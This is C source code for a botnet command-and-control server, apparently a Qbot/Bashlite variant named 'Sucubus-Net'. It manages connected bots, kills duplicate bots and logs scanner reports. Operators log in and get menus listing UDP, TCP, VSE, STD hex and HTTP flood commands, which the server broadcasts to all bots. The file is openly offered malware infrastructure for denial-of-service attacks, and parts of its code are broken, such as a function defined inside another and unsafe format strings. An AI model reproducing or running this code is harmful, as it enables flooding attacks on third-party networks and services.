#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000
                                                                                                                                                                                                                                                                                                                                                                                                                                              
struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile FILE *ticket;
static volatile FILE *staff;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;31m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
					}
				}
			}
		}
	}
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("Logins.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("Logins.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\e[1;31mUsername:\e[0m\e[30m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\e[1;31mPassword:\e[0m\e[30m: ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; %d |Sucubus-Net|V1.0|  %c", '\033', BotsConnected(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line0   [5000];
		char ascii_banner_line1   [5000];
        char ascii_banner_line2   [5000];
        char ascii_banner_line3   [5000];
        char ascii_banner_line4   [5000];
        char ascii_banner_line5   [5000];
        char ascii_banner_line6   [5000];
        char ascii_banner_line7   [5000];
        char ascii_banner_line8   [5000];
        char ascii_banner_line9   [5000];
	
  sprintf(ascii_banner_line0,  "\033[01;31m⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀\r\n");		
  sprintf(ascii_banner_line1,  "\033[01;32m⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿\r\n");
  sprintf(ascii_banner_line2,  "\033[01;33m⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟\r\n");
  sprintf(ascii_banner_line3,  "\033[01;31m⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃\r\n");
  sprintf(ascii_banner_line4,  "\033[01;32m⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃\r\n");
  sprintf(ascii_banner_line5,  "\033[01;33m⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄\r\n");
  sprintf(ascii_banner_line6,  "\033[01;31m⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄\r\n");
  sprintf(ascii_banner_line7,  "\033[01;32m⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄\r\n");
  sprintf(ascii_banner_line8,  "\033[01;33m⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠\r\n");
  sprintf(ascii_banner_line9,  "\033[01;31m⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿\r\n");

  if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "count") || strstr(buf, "Count") || strstr(buf, "COUNT") || strstr(buf, "bots") || strstr(buf, "BOTS")) {
				char botcount [2048];
				memset(botcount, 0, 2048);
				char statuscount [2048];
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    "\e[90mBots\e[1;31m:\e[90m  [\e[0m%d\e[90m]\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(ops,         "\e[90mUsers\e[1;31m:\e[90m [\e[0m%d\e[90m]\r\n", OperatorsConnected, scannerreport);
				sprintf(statuscount, "\e[90mDups\e[1;31m:\e[90m  [\e[0m%d\e[90m]\r\n", TELFound, scannerreport);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, ops, strlen(ops), MSG_NOSIGNAL) == -1) return;
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}

			if(strstr(buf, "port") || strstr(buf, "Port") || strstr(buf, "PORT") || strstr(buf, "ports") || strstr(buf, "Ports") || strstr(buf, "PORTS")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char s2  [800];
				char s3  [800];
				char s4  [800];
				char s5  [800];
				char s6  [800];
				char s8  [800];
				char s9  [800];
				char sb  [800];
				char sc  [800];
				char sa  [800];
				char sm  [800];
         
                sprintf(s2,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m21\e[0m)    = \e[1;31m SFTP          \e[0m\r\n");
                sprintf(s3,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m22\e[0m)    = \e[1;31m SSH           \e[0m\r\n");         
                sprintf(s4,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m23\e[0m)    = \e[1;31m TELNET        \e[0m\r\n");
                sprintf(s5,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m25\e[0m)    = \e[1;31m SMTP          \e[0m\r\n");
                sprintf(s6,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m53\e[0m)    = \e[1;31m DNS           \e[0m\r\n");         
                sprintf(s8,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m69\e[0m)    = \e[1;31m TFTP          \e[0m\r\n");
                sprintf(s9,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m80\e[0m)    = \e[1;31m HTTP          \e[0m\r\n");
                sprintf(sb,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m443\e[0m)   = \e[1;31m HTTPS         \e[0m\r\n");
                sprintf(sc,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m3074\e[0m)  = \e[1;31m XBOX          \e[0m\r\n");
                sprintf(sa,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m5060\e[0m)  = \e[1;31m RTP           \e[0m\r\n");
                sprintf(sm,  "\e[90m PORT \e[1;31m+ \e[0m(\e[1;31m9307\e[0m)  = \e[1;31m PLAYSTATION   \e[0m\r\n");             
 
				if(send(datafd, s2,  strlen(s2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s3,  strlen(s3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s4,  strlen(s4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s5,  strlen(s5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s6,  strlen(s6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s8,  strlen(s8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, s9,  strlen(s9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sb,  strlen(sb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sc,  strlen(sc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sa,  strlen(sa),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sm,  strlen(sm),	MSG_NOSIGNAL) == -1) goto end;
				
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "Help") || strstr(buf, "?") || strstr(buf, "command") || strstr(buf, "COMMAND")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char hp2  [800];
				char hp3  [800];
				char hp4  [800];
				char hp5  [800];
				char hp6  [800];
				char hp7  [800];
				char hp8  [800];

				sprintf(hp2, "\e[90m ATTACK \e[1;31mShows Attack Commands           \r\n");
				sprintf(hp3, "\e[90m COUNT  \e[1;31mShows Count Of Bots/Users/Dups  \r\n");
				sprintf(hp4, "\e[90m CLEAR  \e[1;31mClears Screen, Back To Banner   \r\n");
				sprintf(hp5, "\e[90m LOGOUT \e[1;31mCloses Out Putty Session        \r\n");
				sprintf(hp6, "\e[90m PORTS  \e[1;31mShows Ports For Use Of Attack   \r\n");
				sprintf(hp7, "\e[90m RULES  \e[1;31mShows Botnet Rules To Follow    \r\n");
				sprintf(hp8, "\e[90m TICKET \e[1;31mOpens Ticket To Support Team    \r\n");

				if(send(datafd, hp2,  strlen(hp2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp3,  strlen(hp3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp6,  strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp7,  strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, hp8,  strlen(hp8), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "rule") || strstr(buf, "RULE") || strstr(buf, "RULE") || strstr(buf, "rules") || strstr(buf, "RULES") || strstr(buf, "Rules")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char p2  [800];
				char p3  [800];
				char p4  [800];
				char p5  [800];

				sprintf(p2,  "\e[0m RULE 1\e[90m. \e[1;31mDont share your login            \e[0m\r\n");
				sprintf(p3,  "\e[0m RULE 2\e[90m. \e[1;31mDont Spam Attacks         \e[0m\r\n");
			
				if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;

		pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "TICKET") || strstr(buf, "Ticket") || strstr(buf, "ticket")) {
				char r2  [800];

				sprintf(r2,  "\e[0m !* OPEN (NAME) (QUESTION) \e[0m\r\n");

				if(send(datafd, r2,  strlen(r2), MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "!* OPEN") || strstr(buf, "!* Open") || strstr(buf, "!* open")) {
                FILE *TicketOpen;
                TicketOpen = fopen("Ticket_Open.txt", "a");
			    time_t now;
			    struct tm *gmt;
			    char formatted_gmt [50];
			    char lcltime[50];
			    now = time(NULL);
			    gmt = gmtime(&now);
			    strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(TicketOpen, "Support Ticket Open - [%s] %s\n", formatted_gmt, buf);
                fclose(TicketOpen);
                char ry1  [800];
                sprintf(ry1,  "\e[0m (Ticket Has Been Open)\r\n");              
				if(send(datafd, ry1,  strlen(ry1),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
				if(strstr(buf, "attack") || strstr(buf, "ATTACK") || strstr(buf, "Attack")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls2  [800];
				char ls3  [800];
				char ls4  [800];
				char ls6  [800];
				char ls8  [800];
				char lsb  [800];
						     
				sprintf(ls2,  "\e[1;31m!* STDHEX [\e[0mIP\e[1;31m] [\e[0mPORT\e[1;31m] [\e[0mTIME\e[1;31m] - (\e[0mSTD HEX\e[1;31m)                             \e[0m\r\n");
				sprintf(ls3,  "\e[1;31m!* UDP [\e[0mIP\e[1;31m] [\e[0mPORT\e[1;31m] [\e[0mTIME\e[1;31m] 32 0 10 - (\e[0mUDP FLOOD\e[1;31m)                    \e[0m\r\n");              
				sprintf(ls4,  "\e[1;31m!* TCP [\e[0mIP\e[1;31m] [\e[0mPORT\e[1;31m] [\e[0mTIME\e[1;31m] 32 all 0 10 - (\e[0mTCP FLOOD\e[1;31m)                 \e[0m\r\n");             
				sprintf(ls6,  "\e[1;31m!* VSE [\e[0mIP\e[1;31m] [\e[0mPORT\e[1;31m] [\e[0mTIME\e[1;31m] 32 1024 10 - (\e[0mVSE FLOOD\e[1;31m)                   \e[0m\r\n");
				sprintf(ls8,  "\e[1;31m!* HTTPSTOMP GET [\e[0mIP\e[1;31m] [\e[0mPORT\e[1;31m] \e[0m/ \e[1;31m[\e[0mTIME\e[1;31m] 1024 - (\e[0mHTTP STOMP\e[1;31m)            \e[0m\r\n");
				sprintf(lsb,  "\e[1;31m!* STOP - (\e[0mSTOPS ALL ATTACKS\e[1;31m)                                        \e[0m\r\n");                              

				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, lsb,  strlen(lsb),	MSG_NOSIGNAL) == -1) goto end;



				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
			if(strstr(buf, "!* STOP") || strstr(buf, "!* Stop") || strstr(buf, "!* stop"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\e[0m Stopping Attacks...\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}


			if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
  if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;


				while(1) {
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "logout") || strstr(buf, "LOGOUT") || strstr(buf, "Logout") || strstr(buf, "ext") || strstr(buf, "EXIT") || strstr(buf, "exit")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, "\e[0m Logging out...", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(2);
				goto end;
			}

            trim(buf);
		char input [5000];
        sprintf(input, "\e[0mFourloko#");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s: \"%s\"\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("server_history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s]: %s\n", formatted_gmt, buf);
            fclose(LogFile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}

void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
